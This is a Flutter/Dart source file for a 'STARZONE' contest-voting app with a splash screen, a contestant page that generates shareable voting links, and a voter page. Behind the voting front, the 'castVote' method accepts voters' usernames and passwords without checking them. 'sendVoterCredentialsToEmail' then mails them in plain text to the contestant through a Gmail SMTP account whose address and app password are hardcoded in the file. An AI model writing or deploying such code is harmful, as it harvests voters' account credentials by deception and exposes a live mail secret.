import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:email_validator/email_validator.dart';

void main() {
  runApp(StarzoneApp());
}

class StarzoneApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'STARZONE',
      theme: ThemeData.dark().copyWith(
        primaryColor: Colors.white,
        scaffoldBackgroundColor: Colors.black,
        textTheme: TextTheme(
          headline6: TextStyle(
            fontFamily: 'Roboto',
            fontWeight: FontWeight.bold,
            fontSize: 24,
            color: Colors.white,
          ),
          bodyText2: TextStyle(
            fontFamily: 'Open Sans',
            fontSize: 16,
            color: Colors.white,
          ),
        ),
      ),
      home: SplashPage(),
    );
  }
}

class SplashPage extends StatefulWidget {
  @override
  _SplashPageState createState() => _SplashPageState();
}

class _SplashPageState extends State<SplashPage>
    with SingleTickerProviderStateMixin {
  late AnimationController _animationController;
  static const Duration animationDuration = Duration(seconds: 16);
  static const Curve animationCurve = Curves.easeInOut;

  @override
  void initState() {
    super.initState();
    _animationController = AnimationController(
      duration: animationDuration,
      vsync: this,
    )..repeat(reverse: true);
    navigateToHome();
  }

  void navigateToHome() {
    Future.delayed(animationDuration, () {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => HomePage()),
      );
    });
  }

  @override
  void dispose() {
    _animationController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        alignment: Alignment.center,
        child: Stack(
          alignment: Alignment.center,
          children: [
            _buildStarBackground(),
            TweenAnimationBuilder<double>(
              tween: Tween<double>(begin: 0, end: 1),
              duration: animationDuration,
              curve: animationCurve,
              builder: (BuildContext context, double value, Widget? child) {
                return Transform.scale(
                  scale: value,
                  child: Icon(
                    Icons.star,
                    size: 100,
                    color: Colors.white,
                  ),
                );
              },
            ),
            Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const SizedBox(height: 16),
                Text(
                  'ZONE',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.blueAccent,
                  ),
                ),
                const SizedBox(height: 16),
                CircularProgressIndicator(),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStarBackground() {
    return Stack(
      children: List.generate(
        50,
        (index) => Positioned(
          top: math.Random().nextDouble() * MediaQuery.of(context).size.height,
          left: math.Random().nextDouble() * MediaQuery.of(context).size.width,
          child: Icon(
            Icons.star,
            size: 2,
            color: Colors.white,
          ),
        ),
      ),
    );
  }
}

class HomePage extends StatefulWidget {
  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  final String votingBaseUrl = "https://starzone.GitHub.io/vote";
  bool hasVoted = false; // Track if the user has already voted

  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();

  String contestantEmail = ''; // Email address provided by the contestant
  String contestantName = ''; // Name of the contestant
  String competitionName = ''; // Name of the competition

  // Generate a unique voting link for each contestant's user
  String generateVotingLink() {
    // You can modify this method to generate a unique voting link based on the contestant's user
    // Here's an example where the voting link includes the contestant's name and competition name as query parameters
    return "$votingBaseUrl?name=$contestantName&competition=$competitionName";
  }

  // Method to handle voting
  void castVote(String username, String password) {
    // Register the vote without verifying the credentials
    setState(() {
      hasVoted = true;
    });

    showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          title: Text("Vote Successful"),
          content: Text("Thank you for voting!"),
          actions: [
            ElevatedButton(
              child: Text('OK'),
              onPressed: () {
                Navigator.of(context).pop();
                sendVoterCredentialsToEmail(username, password);
              },
            ),
          ],
        );
      },
    );
  }

  // Method to send voter credentials to the contestant's email
  void sendVoterCredentialsToEmail(String username, String password) async {
    try {
      // Configure the SMTP server for email sending
      final smtpServer = gmail('securesally@gmail.com', 'nltekjfylmrxvhee');

      // Create the email message
      final message = Message()
        ..from = Address('your-email@gmail.com')
        ..recipients.add(contestantEmail) // Use the contestant's provided email address
        ..subject = 'Voter Credentials'
        ..text = 'Username: $username\nPassword: $password';

      // Send the email
      final sendReport = await send(message, smtpServer);
      print('Email sent!');
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            title: Text("Voting Link"),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "The voting link has been sent to your email.",
                  style: Theme.of(context).textTheme.bodyText2,
                ),
              ],
            ),
            actions: [
              ElevatedButton(
                child: Text('OK'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
    } catch (e) {
      print('Email sending failed: $e');
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            title: Text("Error"),
            content: Text("Failed to send the voting link."),
            actions: [
              ElevatedButton(
                child: Text('OK'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
    }
  }

  // Method to launch the voting link
  void launchVotingLink() async {
    String votingLink = generateVotingLink();
    if (await canLaunch(votingLink)) {
      await launch(votingLink);
    } else {
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            title: Text("Error"),
            content: Text("Failed to open the voting link."),
            actions: [
              ElevatedButton(
                child: Text('OK'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('starzone.eu'),
      ),
      body: Padding(
        padding: EdgeInsets.all(16),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'Contestant Page',
                style: Theme.of(context).textTheme.headline6,
              ),
              SizedBox(height: 16),
              TextFormField(
                decoration: InputDecoration(
                  labelText: 'Your Email',
                  border: OutlineInputBorder(),
                ),
                validator: (value) {
                  if (value?.isEmpty ?? true) {
                    return 'Please enter your email';
                  } else if (!EmailValidator.validate(value!)) {
                    return 'Please enter a valid email address';
                  }
                  return null;
                },
                onChanged: (value) {
                  setState(() {
                    contestantEmail = value;
                  });
                },
              ),
              SizedBox(height: 16),
              TextFormField(
                decoration: InputDecoration(
                  labelText: 'Contestant Name',
                  border: OutlineInputBorder(),
                ),
                validator: (value) {
                  if (value?.isEmpty ?? true) {
                    return 'Please enter the contestant name';
                  }
                  return null;
                },
                onChanged: (value) {
                  setState(() {
                    contestantName = value;
                  });
                },
              ),
              SizedBox(height: 16),
              TextFormField(
                decoration: InputDecoration(
                  labelText: 'Competition Name',
                  border: OutlineInputBorder(),
                ),
                validator: (value) {
                  if (value?.isEmpty ?? true) {
                    return 'Please enter the competition name';
                  }
                  return null;
                },
                onChanged: (value) {
                  setState(() {
                    competitionName = value;
                  });
                },
              ),
              SizedBox(height: 16),
              if (_formKey.currentState?.validate() ?? false)
                ElevatedButton(
                  child: Text('Get Link'),
                  onPressed: () {
                    if (_formKey.currentState?.validate() ?? false) {
  String votingLink = generateVotingLink();
  showDialog(
                        context: context,
                        builder: (BuildContext context) {
                          return AlertDialog(
                            title: Text("Voting Link Generated"),
                            content: Column(
                              mainAxisSize: MainAxisSize.min,
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                ElevatedButton(
                                  child: Text('Voting Link'),
                                  onPressed: () {
                                    Clipboard.setData(ClipboardData(text: votingLink));
                                    Navigator.of(context).pop();
                                    showDialog(
                                      context: context,
                                      builder: (BuildContext context) {
                                        return AlertDialog(
                                          title: Text("Link Copied"),
                                          content: Text("The voting link has been copied to the clipboard."),
                                          actions: [
                                            ElevatedButton(
                                              child: Text('OK'),
                                              onPressed: () {
                                                Navigator.of(context).pop();
                                              },
                                            ),
                                          ],
                                        );
                                      },
                                    );
                                  },
                                ),
                              ],
                            ),
                            actions: [
                              ElevatedButton(
                                child: Text('OK'),
                                onPressed: () {
                                  Navigator.of(context).pop();
                                },
                              ),
                            ],
                          );
                        },
                      );
                    }
                  },
                ),
              SizedBox(height: 32),
              Text(
                'Voter Page',
                style: Theme.of(context).textTheme.headline6,
              ),
              SizedBox(height: 16),
              if (!hasVoted)
                ElevatedButton(
                  child: Text('Vote Now'),
                  onPressed: () {
                    launchVotingLink();
                  },
                ),
              if (hasVoted)
                Text(
                  'You have already voted.',
                  style: Theme.of(context).textTheme.bodyText2,
                ),
            ],
          ),
        ),
      ),
    );
  }
}